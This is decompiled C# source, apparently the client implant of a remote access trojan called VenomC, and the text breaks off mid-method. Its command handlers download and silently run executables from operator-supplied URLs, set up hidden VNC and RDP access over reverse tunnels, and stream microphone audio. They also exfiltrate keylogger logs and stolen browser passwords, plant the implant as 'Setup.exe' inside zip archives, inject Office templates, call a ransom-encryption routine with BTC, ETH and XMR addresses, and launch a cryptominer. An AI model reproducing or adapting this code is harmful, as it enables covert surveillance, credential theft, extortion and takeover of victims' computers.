using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using NAudio.Wave;
using VenomC.Chaos.AForge.Video.DirectShow;
using VenomC.Chaos.NAudio.Wave;
using VenomC.Chaos.NAudio.Wave.WaveInputs;
using VenomC.Chaos.NAudio.Wave.WaveOutputs;
using VenomC.Chaos.Packets.Clt;
using VenomC.Chaos.Packets.Ser;
using VenomC.Chaos.Registry;
using VenomC.Chaos.Utilities;

public static class GClass77
{
	public struct GStruct3
	{
		public uint uint_0;

		public uint uint_1;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] byte_0;

		public uint uint_2;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] byte_1;

		public uint uint_3;

		public IPAddress LocalAddress => new IPAddress(uint_1);

		public ushort LocalPort => BitConverter.ToUInt16(new byte[2]
		{
			byte_0[1],
			byte_0[0]
		}, 0);

		public IPAddress RemoteAddress => new IPAddress(uint_2);

		public ushort RemotePort => BitConverter.ToUInt16(new byte[2]
		{
			byte_1[1],
			byte_1[0]
		}, 0);
	}

	public struct GStruct4
	{
		public uint uint_0;

		private readonly GStruct3 gstruct3_0;
	}

	private enum Enum13
	{
		const_0,
		const_1,
		const_2,
		const_3,
		const_4,
		const_5,
		const_6,
		const_7,
		const_8
	}

	[CompilerGenerated]
	private sealed class Class75
	{
		public GClass13 gclass13_0;

		internal void method_0(object sender, GEventArgs1 e)
		{
			new GetAudioStreamResponse(e.Buffer).Execute(gclass13_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class76
	{
		public GClass13 gclass13_0;

		public DoClientUp doClientUp_0;

		internal void method_0()
		{
			new SetStatus("Downloading file...").Execute(gclass13_0);
			string text = GClass47.smethod_1(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(doClientUp_0.DownloadURL, text);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Updating...").Execute(gclass13_0);
			GClass33.smethod_0(gclass13_0, text);
		}
	}

	[CompilerGenerated]
	private sealed class Class77
	{
		public bool bool_0;

		public string string_0;

		internal void method_0(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		}
	}

	[CompilerGenerated]
	private sealed class Class78
	{
		public DoDownloadFile doDownloadFile_0;

		public GClass13 gclass13_0;

		internal void method_0()
		{
			semaphore_0.WaitOne();
			try
			{
				GClass6 gClass = new GClass6(doDownloadFile_0.RemotePath);
				if (gClass.MaxBlocks < 0)
				{
					throw new Exception(gClass.LastError);
				}
				for (int i = 0; i < gClass.MaxBlocks; i++)
				{
					if (!gclass13_0.Connected)
					{
						break;
					}
					if (dictionary_1.ContainsKey(doDownloadFile_0.ID))
					{
						break;
					}
					if (gClass.method_1(i, out var readBytes))
					{
						new DoDFResp(doDownloadFile_0.ID, Path.GetFileName(doDownloadFile_0.RemotePath), readBytes, gClass.MaxBlocks, i, gClass.LastError).Execute(gclass13_0);
						continue;
					}
					throw new Exception(gClass.LastError);
				}
			}
			catch (Exception ex)
			{
				new DoDFResp(doDownloadFile_0.ID, Path.GetFileName(doDownloadFile_0.RemotePath), new byte[0], -1, -1, ex.Message).Execute(gclass13_0);
			}
			semaphore_0.Release();
		}
	}

	[CompilerGenerated]
	private sealed class Class79
	{
		public bool bool_0;

		public string string_0;

		internal void method_0(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		}
	}

	[CompilerGenerated]
	private sealed class Class80
	{
		public bool bool_0;

		public string string_0;

		internal void method_0(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		}
	}

	[CompilerGenerated]
	private sealed class Class81
	{
		public bool bool_0;

		public string string_0;

		internal void method_0(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		}
	}

	[CompilerGenerated]
	private sealed class Class82
	{
		public bool bool_0;

		public string string_0;

		internal void method_0(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		}
	}

	[CompilerGenerated]
	private sealed class Class83
	{
		public DDAndE ddandE_0;

		public GClass13 gclass13_0;

		internal void method_0()
		{
			string text = GClass47.smethod_1(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(ddandE_0.URL, text);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Downloaded File!").Execute(gclass13_0);
			try
			{
				GClass47.smethod_3(text);
				if (!GClass47.smethod_2(File.ReadAllBytes(text)))
				{
					throw new Exception("no pe file");
				}
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (ddandE_0.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
			}
			catch
			{
				GClass8.DeleteFile(text);
				new SetStatus("Execution failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Executed File!").Execute(gclass13_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class84
	{
		public GClass13 gclass13_0;

		internal void method_0()
		{
			string token = "";
			try
			{
				Task.Run((Action)GClass52.smethod_9).Wait();
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Vnc Installed on Target!").Execute(gclass13_0);
			try
			{
				GClass52.smethod_52(token, "5901");
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Activated Reverse Tcp,Vnc Login now!").Execute(gclass13_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class85
	{
		public GClass13 gclass13_0;

		internal void method_0()
		{
			string token = "";
			try
			{
				Task.Run((Action)GClass52.smethod_15).Wait();
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Rdp Installed on Target!").Execute(gclass13_0);
			try
			{
				GClass52.smethod_52(token, "3389");
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Activating ReverseTcp,Rdp Login now!").Execute(gclass13_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class86
	{
		public GClass13 gclass13_0;

		public InstallTunnel installTunnel_0;

		internal void method_0()
		{
			try
			{
				Task.Run(async () => GClass52.DelRdpMethodAsync()).Wait();
				GClass52.smethod_80();
				GClass52.smethod_85();
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Killed open tunnel!").Execute(gclass13_0);
		}

		internal void method_1()
		{
			try
			{
				string pOKEN = installTunnel_0.POKEN;
				string pORT = installTunnel_0.PORT;
				string pROTO = installTunnel_0.PROTO;
				GClass52.smethod_53(pOKEN, pORT, pROTO);
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(gclass13_0);
				return;
			}
			new SetStatus("Reverce Connection Activated!").Execute(gclass13_0);
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class87
	{
		public static readonly Class87 class87_0 = new Class87();

		public static Func<Task<Task>> func_0;

		public static Func<DriveInfo, bool> func_1;

		public static Func<string, string> func_2;

		public static Func<string, string> func_3;

		public static Func<string, string> func_4;

		public static Func<string, string> func_5;

		public static Func<string, string> func_6;

		public static Func<string, string> func_7;

		public static Func<FileInfo, bool> func_8;

		public static Func<FileInfo, string> func_9;

		public static Func<string, string> func_10;

		public static Action action_0;

		public static Action action_1;

		public static Func<Task<Task>> func_11;

		public static Action action_2;

		public static Action action_3;

		public static Action action_4;

		public static Func<Task<Task>> func_12;

		public static Func<Task<Task>> func_13;

		public static Action action_5;

		public static Func<Task<string>> func_14;

		public static Func<Task<Task>> func_15;

		public static Func<Task<Task>> func_16;

		public static Action action_6;

		public static Action action_7;

		public static Action action_8;

		public static Action action_9;

		public static Action action_10;

		public static Action action_11;

		public static Action action_12;

		public static Action action_13;

		public static Action action_14;

		public static Action action_15;

		public static Action action_16;

		public static Action action_17;

		public static Action action_18;

		public static Action action_19;

		public static Action action_20;

		public static Action action_21;

		public static Action action_22;

		public static Action action_23;

		public static Action action_24;

		public static Action action_25;

		public static Action action_26;

		public static Action action_27;

		public static Action action_28;

		public static Action action_29;

		public static Action action_30;

		public static Action action_31;

		public static Action action_32;

		public static Action action_33;

		public static Action action_34;

		public static Action action_35;

		internal async Task<Task> _003CHandleActivateTunnel_003Eb__43_2()
		{
			return GClass52.DelRdpMethodAsync();
		}

		internal bool method_0(DriveInfo d)
		{
			return d.IsReady;
		}

		internal string method_1(string formattedKeyValue)
		{
			return "0" + formattedKeyValue;
		}

		internal string method_2(string formattedKeyValue)
		{
			return "1" + formattedKeyValue;
		}

		internal string method_3(string formattedKeyValue)
		{
			return "2" + formattedKeyValue;
		}

		internal string method_4(string formattedKeyValue)
		{
			return "3" + formattedKeyValue;
		}

		internal string method_5(string formattedKeyValue)
		{
			return "4" + formattedKeyValue;
		}

		internal string method_6(string formattedKeyValue)
		{
			return "5" + formattedKeyValue;
		}

		internal bool method_7(FileInfo file)
		{
			return file.Name != "desktop.ini";
		}

		internal string method_8(FileInfo file)
		{
			return $"{file.Name}||{file.FullName}";
		}

		internal string method_9(string formattedKeyValue)
		{
			return "6" + formattedKeyValue;
		}

		internal void method_10()
		{
			GClass52.smethod_97();
		}

		internal void method_11()
		{
			GClass52.smethod_84();
		}

		internal async Task<Task> _003CHandleDoRemoveRdp_003Eb__85_1()
		{
			return GClass52.DelRdpMethodAsync();
		}

		internal void method_12()
		{
			GClass52.smethod_80();
		}

		internal void method_13()
		{
			GClass52.smethod_85();
		}

		internal void method_14()
		{
			GClass52.smethod_25();
		}

		internal async Task<Task> _003CHandleDoRemoveVnc_003Eb__86_0()
		{
			return GClass52.DelRdpMethodAsync();
		}

		internal async Task<Task> _003CHandleDoRemoveTunnel_003Eb__87_0()
		{
			return GClass52.DelRdpMethodAsync();
		}

		internal void method_15()
		{
			GClass52.smethod_1();
		}

		internal Task<string> method_16()
		{
			return GClass52.PublicUrl();
		}

		internal async Task<Task> _003CHandleDoInstGarbagedpr_003Eb__106_0()
		{
			return GClass52.DelRdpMethodAsync();
		}

		internal async Task<Task> _003CHandleDoInstGarbagedpr_003Eb__106_1()
		{
			return GClass52.InstallRdpMethodAsync();
		}

		internal void method_17()
		{
			GClass52.smethod_108();
		}

		internal void method_18()
		{
			GClass52.smethod_23();
		}

		internal void method_19()
		{
			Class70.smethod_0(turnon: false);
		}

		internal void method_20()
		{
			Class70.smethod_1(open: false);
		}

		internal void method_21()
		{
			Class70.smethod_2(show: false);
		}

		internal void method_22()
		{
			Class70.smethod_3(show: false);
		}

		internal void method_23()
		{
			Class70.smethod_4(start: false);
		}

		internal void method_24()
		{
			Class70.smethod_5(show: false);
		}

		internal void method_25()
		{
			Class70.smethod_6(show: false);
		}

		internal void method_26()
		{
			Class70.smethod_7(show: false);
		}

		internal void method_27()
		{
			Class70.smethod_8();
		}

		internal void method_28()
		{
			Class70.smethod_9(show: false);
		}

		internal void method_29()
		{
			Class70.smethod_10(show: false);
		}

		internal void method_30()
		{
			Class70.smethod_11();
		}

		internal void method_31()
		{
			Class70.smethod_12();
		}

		internal void method_32()
		{
			Class70.smethod_0(turnon: true);
		}

		internal void method_33()
		{
			Class70.smethod_1(open: true);
		}

		internal void method_34()
		{
			Class70.smethod_2(show: true);
		}

		internal void method_35()
		{
			Class70.smethod_3(show: true);
		}

		internal void method_36()
		{
			Class70.smethod_4(start: true);
		}

		internal void method_37()
		{
			Class70.smethod_5(show: true);
		}

		internal void method_38()
		{
			Class70.smethod_6(show: true);
		}

		internal void method_39()
		{
			Class70.smethod_7(show: true);
		}

		internal void method_40()
		{
			Class70.smethod_8();
		}

		internal void method_41()
		{
			Class70.smethod_9(show: true);
		}

		internal void method_42()
		{
			Class70.smethod_10(show: true);
		}

		internal void method_43()
		{
			Class70.smethod_11();
		}

		internal void method_44()
		{
			GClass52.smethod_43();
		}

		internal void method_45()
		{
			GClass52.smethod_44();
		}

		internal void method_46()
		{
			GClass52.smethod_38();
		}
	}

	[CompilerGenerated]
	private sealed class Class88
	{
		public GClass13 gclass13_0;

		public DoInjOffice doInjOffice_0;

		public Action action_0;

		internal void method_0()
		{
			try
			{
				new SetStatus("Injecting Default Template....").Execute(gclass13_0);
				Task.Run(delegate
				{
					GClass52.smethod_107(doInjOffice_0.URL, doInjOffice_0.Name);
				}).Wait();
			}
			catch
			{
			}
			new SetStatus("Office Injected with Venom....").Execute(gclass13_0);
		}

		internal void method_1()
		{
			GClass52.smethod_107(doInjOffice_0.URL, doInjOffice_0.Name);
		}
	}

	[CompilerGenerated]
	private sealed class Class89
	{
		public DoShowMessageBox doShowMessageBox_0;

		internal void method_0()
		{
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			MessageBox.Show(doShowMessageBox_0.Text, doShowMessageBox_0.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), doShowMessageBox_0.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), doShowMessageBox_0.MessageboxIcon), (MessageBoxDefaultButton)0, (MessageBoxOptions)131072);
		}
	}

	[CompilerGenerated]
	private sealed class Class90
	{
		public GClass13 gclass13_0;

		internal void method_0()
		{
			try
			{
				int num = 1;
				if (!Directory.Exists(Klover.LogDirectory))
				{
					new GetKeyResp("", new byte[0], -1, -1, "", num, 0).Execute(gclass13_0);
					return;
				}
				FileInfo[] files = new DirectoryInfo(Klover.LogDirectory).GetFiles();
				if (files.Length == 0)
				{
					new GetKeyResp("", new byte[0], -1, -1, "", num, 0).Execute(gclass13_0);
					return;
				}
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					GClass6 gClass = new GClass6(fileInfo.FullName);
					if (gClass.MaxBlocks < 0)
					{
						new GetKeyResp("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(gclass13_0);
					}
					for (int j = 0; j < gClass.MaxBlocks; j++)
					{
						if (gClass.method_1(j, out var readBytes))
						{
							new GetKeyResp(Path.GetFileName(fileInfo.Name), readBytes, gClass.MaxBlocks, j, gClass.LastError, num, files.Length).Execute(gclass13_0);
						}
						else
						{
							new GetKeyResp("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(gclass13_0);
						}
					}
					num++;
				}
			}
			catch (Exception ex)
			{
				new GetKeyResp("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(gclass13_0);
			}
		}
	}

	[CompilerGenerated]
	private sealed class Class91
	{
		public GClass13 gclass13_0;

		internal void method_0()
		{
			try
			{
				int num = 1;
				Directory.Exists(PassDirectory);
				if (!Directory.Exists(PassDirectory))
				{
					new GetDPResp("", new byte[0], -1, -1, "", num, 0).Execute(gclass13_0);
					return;
				}
				FileInfo[] files = new DirectoryInfo(PassDirectory).GetFiles();
				if (files.Length == 0)
				{
					new GetDPResp("", new byte[0], -1, -1, "", num, 0).Execute(gclass13_0);
					return;
				}
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					GClass6 gClass = new GClass6(fileInfo.FullName);
					if (gClass.MaxBlocks < 0)
					{
						new GetDPResp("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(gclass13_0);
					}
					for (int j = 0; j < gClass.MaxBlocks; j++)
					{
						if (gClass.method_1(j, out var readBytes))
						{
							new GetDPResp(Path.GetFileName(fileInfo.Name), readBytes, gClass.MaxBlocks, j, gClass.LastError, num, files.Length).Execute(gclass13_0);
						}
						else
						{
							new GetDPResp("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(gclass13_0);
						}
					}
					num++;
				}
			}
			catch (Exception ex)
			{
				new GetDPResp("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(gclass13_0);
			}
		}
	}

	[CompilerGenerated]
	private sealed class Class92
	{
		public GClass13 gclass13_0;

		internal void method_0()
		{
			try
			{
				if (!File.Exists(string_3))
				{
					GClass52.smethod_33();
				}
				int num = 1;
				if (!Directory.Exists(dkPassDirectory))
				{
					new GetAllEvilEyeResponse("", new byte[0], -1, -1, "", num, 0).Execute(gclass13_0);
					return;
				}
				FileInfo[] files = new DirectoryInfo(dkPassDirectory).GetFiles();
				if (files.Length == 0)
				{
					new GetAllEvilEyeResponse("", new byte[0], -1, -1, "", num, 0).Execute(gclass13_0);
					return;
				}
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					GClass6 gClass = new GClass6(fileInfo.FullName);
					if (gClass.MaxBlocks < 0)
					{
						new GetAllEvilEyeResponse("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(gclass13_0);
					}
					for (int j = 0; j < gClass.MaxBlocks; j++)
					{
						if (gClass.method_1(j, out var readBytes))
						{
							new GetAllEvilEyeResponse(Path.GetFileName(fileInfo.Name), readBytes, gClass.MaxBlocks, j, gClass.LastError, num, files.Length).Execute(gclass13_0);
						}
						else
						{
							new GetAllEvilEyeResponse("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(gclass13_0);
						}
					}
					num++;
				}
			}
			catch (Exception ex)
			{
				new GetAllEvilEyeResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(gclass13_0);
			}
		}
	}

	[CompilerGenerated]
	private sealed class Class93
	{
		public DoEncrypt doEncrypt_0;

		internal void method_0()
		{
			GClass52.smethod_5(doEncrypt_0.btc, doEncrypt_0.eth, doEncrypt_0.xmr);
		}
	}

	[CompilerGenerated]
	private sealed class Class94
	{
		public string string_0;

		public string string_1;

		public string string_2;

		internal void method_0()
		{
			GClass52.smethod_73(string_0, string_1, string_2);
		}
	}

	[CompilerGenerated]
	private sealed class Class95
	{
		public string string_0;

		internal void method_0()
		{
			GClass52.smethod_52(string_0, "5901");
		}
	}

	[CompilerGenerated]
	private sealed class Class96
	{
		public string string_0;

		internal void method_0()
		{
			GClass52.smethod_52(string_0, "3389");
		}
	}

	[CompilerGenerated]
	private sealed class Class97
	{
		public Domine domine_0;

		internal void method_0()
		{
			GClass52.smethod_46(domine_0.Pool, domine_0.Wallet, domine_0.Password, domine_0.Algo, domine_0.Threads);
		}

		internal void method_1()
		{
			GClass52.smethod_42(domine_0.Pool, domine_0.Wallet, domine_0.Password, domine_0.Algo, domine_0.Threads);
		}
	}

	[CompilerGenerated]
	private static WaveInEvent waveInEvent_0;

	[CompilerGenerated]
	private static bool bool_0;

	[CompilerGenerated]
	private static BufferedWaveProvider bufferedWaveProvider_0;

	[CompilerGenerated]
	private static WaveOut waveOut_0;

	public static UnsafeStreamCodec unsafeStreamCodec_0;

	private static Shell shell_0;

	private static Dictionary<int, string> dictionary_0 = new Dictionary<int, string>();

	private static Dictionary<int, string> dictionary_1 = new Dictionary<int, string>();

	private const string string_0 = "$E$";

	private static readonly Semaphore semaphore_0 = new Semaphore(2, 2);

	private const string string_1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	private static readonly Random random_0 = new Random(Environment.TickCount);

	public static string string_2 = Path.Combine(dkPassDirectory, "DarkEye_Passwords.txt");

	public static string string_3 = Path.Combine(Path.GetTempPath(), "Venom\\DarkEye\\DarkEye_Passwords.zip");

	public static string string_4 = Path.Combine(dkPassDirectory, "HTML");

	public static bool bool_1;

	public static bool bool_2;

	public static GClass13 gclass13_0;

	public static int int_0;

	public static int int_1;

	public static VideoCaptureDevice videoCaptureDevice_0;

	private static WaveInEvent _waveInEvent
	{
		[CompilerGenerated]
		get
		{
			return waveInEvent_0;
		}
		[CompilerGenerated]
		set
		{
			waveInEvent_0 = value;
		}
	}

	public static bool StreamRunning
	{
		[CompilerGenerated]
		get
		{
			return bool_0;
		}
		[CompilerGenerated]
		set
		{
			bool_0 = value;
		}
	}

	private static BufferedWaveProvider WaveProvider
	{
		[CompilerGenerated]
		get
		{
			return bufferedWaveProvider_0;
		}
		[CompilerGenerated]
		set
		{
			bufferedWaveProvider_0 = value;
		}
	}

	private static WaveOut WaveOut
	{
		[CompilerGenerated]
		get
		{
			return waveOut_0;
		}
		[CompilerGenerated]
		set
		{
			waveOut_0 = value;
		}
	}

	public static string PassDirectory => Path.Combine(Path.GetTempPath(), "Chrome\\Directory\\Browsers\\");

	public static string dkPassDirectory => Path.Combine(Path.GetTempPath(), "Venom\\DarkEye\\");

	public static string dkPassDirectoryB => Path.Combine(Path.GetTempPath(), "Venom\\DarkEye\\Browsers\\");

	public static void smethod_0(GetAudioDevices command, GClass13 client)
	{
		try
		{
			Dictionary<string, int> dictionary = new Dictionary<string, int>();
			int deviceCount = WaveIn.DeviceCount;
			for (int i = 0; i < deviceCount; i++)
			{
				GStruct1 capabilities = WaveIn.GetCapabilities(i);
				dictionary.Add(capabilities.ProductName, capabilities.Channels);
			}
			if (dictionary.Count > 0)
			{
				new GetAudioDevicesResponse(dictionary).Execute(client);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_1(GetAudioStream command, GClass13 client)
	{
		try
		{
			GClass15 waveFormat = new GClass15(command.SampleRate, command.Channels);
			_waveInEvent = new WaveInEvent
			{
				BufferMilliseconds = 50,
				DeviceNumber = command.Device,
				WaveFormat = waveFormat
			};
			_waveInEvent.StartRecording();
			_waveInEvent.DataAvailable += delegate(object sender, GEventArgs1 e)
			{
				new GetAudioStreamResponse(e.Buffer).Execute(client);
			};
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_2(StopAudioStream command, GClass13 client)
	{
		try
		{
			_waveInEvent.StopRecording();
			_waveInEvent.Dispose();
			StreamRunning = false;
			new StopAudioStreamResponse(StreamRunning).Execute(client);
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_3(DoSpeak command, GClass13 client)
	{
		try
		{
			WaveOut = new WaveOut();
			WaveProvider = new BufferedWaveProvider(new GClass15());
			WaveOut.Init(WaveProvider);
			WaveProvider.AddSamples(command.SpokenData, 0, command.SpokenData.Length);
			WaveOut.Play();
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_4(GetAuthentication command, GClass13 client)
	{
		GClass49.smethod_0();
		new GetAuthenticationResponse(GClass5.string_0, GClass56.FullName, GClass65.smethod_1(), GClass49.GeoInfo.Country, GClass49.GeoInfo.CountryCode, GClass49.GeoInfo.Region, GClass49.GeoInfo.City, GClass49.ImageIndex, GClass46.HardwareId, GClass65.smethod_0(), GClass64.smethod_1(), GClass5.string_10).Execute(client);
		if (GClass69.AddStartUpFailed)
		{
			Thread.Sleep(2000);
			new SetStatus("Adding to startup failed.").Execute(client);
		}
	}

	public static void smethod_5(DoClientUp command, GClass13 client)
	{
		if (string.IsNullOrEmpty(command.DownloadURL))
		{
			if (!dictionary_0.ContainsKey(command.ID))
			{
				dictionary_0.Add(command.ID, GClass47.smethod_1(".exe"));
			}
			string text = dictionary_0[command.ID];
			try
			{
				if (command.CurrentBlock == 0 && !GClass47.smethod_2(command.Block))
				{
					throw new Exception("No executable file");
				}
				GClass6 gClass = new GClass6(text);
				if (!gClass.method_2(command.Block, command.CurrentBlock))
				{
					throw new Exception(gClass.LastError);
				}
				if (command.CurrentBlock + 1 == command.MaxBlocks)
				{
					if (dictionary_0.ContainsKey(command.ID))
					{
						dictionary_0.Remove(command.ID);
					}
					new SetStatus("Updating...").Execute(client);
					GClass33.smethod_0(client, text);
				}
				return;
			}
			catch (Exception ex)
			{
				if (dictionary_0.ContainsKey(command.ID))
				{
					dictionary_0.Remove(command.ID);
				}
				GClass8.DeleteFile(text);
				new SetStatus($"Update failed: {ex.Message}").Execute(client);
				return;
			}
		}
		new Thread((ThreadStart)delegate
		{
			new SetStatus("Downloading file...").Execute(client);
			string text2 = GClass47.smethod_1(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(command.DownloadURL, text2);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(client);
				return;
			}
			new SetStatus("Updating...").Execute(client);
			GClass33.smethod_0(client, text2);
		}).Start();
	}

	public static void smethod_6(DoClientUninstall command, GClass13 client)
	{
		new SetStatus("Uninstalling... bye ;(").Execute(client);
		GClass32.smethod_0(client);
	}

	public static void smethod_7(GetDirectory command, GClass13 client)
	{
		bool bool_0 = false;
		string string_0 = null;
		Action<string> action = delegate(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		};
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(command.RemotePath);
			FileInfo[] files = directoryInfo.GetFiles();
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			string[] array = new string[files.Length];
			long[] array2 = new long[files.Length];
			string[] array3 = new string[directories.Length];
			int num = 0;
			FileInfo[] array4 = files;
			foreach (FileInfo fileInfo in array4)
			{
				array[num] = fileInfo.Name;
				array2[num] = fileInfo.Length;
				num++;
			}
			if (array.Length == 0)
			{
				array = new string[1] { "$E$" };
				array2 = new long[1];
			}
			num = 0;
			DirectoryInfo[] array5 = directories;
			foreach (DirectoryInfo directoryInfo2 in array5)
			{
				array3[num] = directoryInfo2.Name;
				num++;
			}
			if (array3.Length == 0)
			{
				array3 = new string[1] { "$E$" };
			}
			new GetDirectoryResponse(array, array3, array2).Execute(client);
		}
		catch (UnauthorizedAccessException)
		{
			action("GetDirectory No permission");
		}
		catch (SecurityException)
		{
			action("GetDirectory No permission");
		}
		catch (PathTooLongException)
		{
			action("GetDirectory Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("GetDirectory Directory not found");
		}
		catch (FileNotFoundException)
		{
			action("GetDirectory File not found");
		}
		catch (IOException)
		{
			action("GetDirectory I/O error");
		}
		catch (Exception)
		{
			action("GetDirectory Failed");
		}
		finally
		{
			if (bool_0 && !string.IsNullOrEmpty(string_0))
			{
				new SetStatusFileManager(string_0, setLastDirectorySeen: true).Execute(client);
			}
		}
	}

	public static void smethod_8(DoDownloadFile command, GClass13 client)
	{
		new Thread((ThreadStart)delegate
		{
			semaphore_0.WaitOne();
			try
			{
				GClass6 gClass = new GClass6(command.RemotePath);
				if (gClass.MaxBlocks < 0)
				{
					throw new Exception(gClass.LastError);
				}
				for (int i = 0; i < gClass.MaxBlocks; i++)
				{
					if (!client.Connected)
					{
						break;
					}
					if (dictionary_1.ContainsKey(command.ID))
					{
						break;
					}
					if (!gClass.method_1(i, out var readBytes))
					{
						throw new Exception(gClass.LastError);
					}
					new DoDFResp(command.ID, Path.GetFileName(command.RemotePath), readBytes, gClass.MaxBlocks, i, gClass.LastError).Execute(client);
				}
			}
			catch (Exception ex)
			{
				new DoDFResp(command.ID, Path.GetFileName(command.RemotePath), new byte[0], -1, -1, ex.Message).Execute(client);
			}
			semaphore_0.Release();
		}).Start();
	}

	public static void smethod_9(DoDownloadFileCancel command, GClass13 client)
	{
		if (!dictionary_1.ContainsKey(command.ID))
		{
			dictionary_1.Add(command.ID, "canceled");
			new DoDFResp(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
		}
	}

	public static void smethod_10(DoUF command, GClass13 client)
	{
		if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
		{
			GClass8.DeleteFile(command.RemotePath);
		}
		new GClass6(command.RemotePath).method_2(command.Block, command.CurrentBlock);
	}

	public static void smethod_11(DoPathDelete command, GClass13 client)
	{
		bool bool_0 = false;
		string string_0 = null;
		Action<string> action = delegate(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		};
		try
		{
			switch (command.PathType)
			{
			case GEnum4.const_1:
				Directory.Delete(command.Path, recursive: true);
				new SetStatusFileManager("Deleted directory", setLastDirectorySeen: false).Execute(client);
				break;
			case GEnum4.const_0:
				File.Delete(command.Path);
				new SetStatusFileManager("Deleted file", setLastDirectorySeen: false).Execute(client);
				break;
			}
			smethod_7(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("DeletePath No permission");
		}
		catch (PathTooLongException)
		{
			action("DeletePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("DeletePath Path not found");
		}
		catch (IOException)
		{
			action("DeletePath I/O error");
		}
		catch (Exception)
		{
			action("DeletePath Failed");
		}
		finally
		{
			if (bool_0 && !string.IsNullOrEmpty(string_0))
			{
				new SetStatusFileManager(string_0, setLastDirectorySeen: false).Execute(client);
			}
		}
	}

	public static void smethod_12(DoInject command, GClass13 client)
	{
		bool bool_0 = false;
		string string_0 = null;
		Action<string> action = delegate(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		};
		string path = command.Path;
		try
		{
			if (command.PathType == GEnum4.const_0)
			{
				using (ZipArchive destination = ZipFile.Open(path, ZipArchiveMode.Update))
				{
					destination.CreateEntryFromFile(GClass69.InstallPath, "Setup.exe");
				}
				new SetStatusFileManager("File Injected file", setLastDirectorySeen: false).Execute(client);
			}
			smethod_7(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("File Inject No permission");
		}
		catch (PathTooLongException)
		{
			action("File Inject Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("File Inject Path not found");
		}
		catch (IOException)
		{
			action("File Inject I/O error");
		}
		catch (Exception)
		{
			action("File Inject Failed");
		}
		finally
		{
			if (bool_0 && !string.IsNullOrEmpty(string_0))
			{
				new SetStatusFileManager(string_0, setLastDirectorySeen: false).Execute(client);
			}
		}
	}

	public static void smethod_13(DoZip command, GClass13 client)
	{
		bool bool_0 = false;
		string string_0 = null;
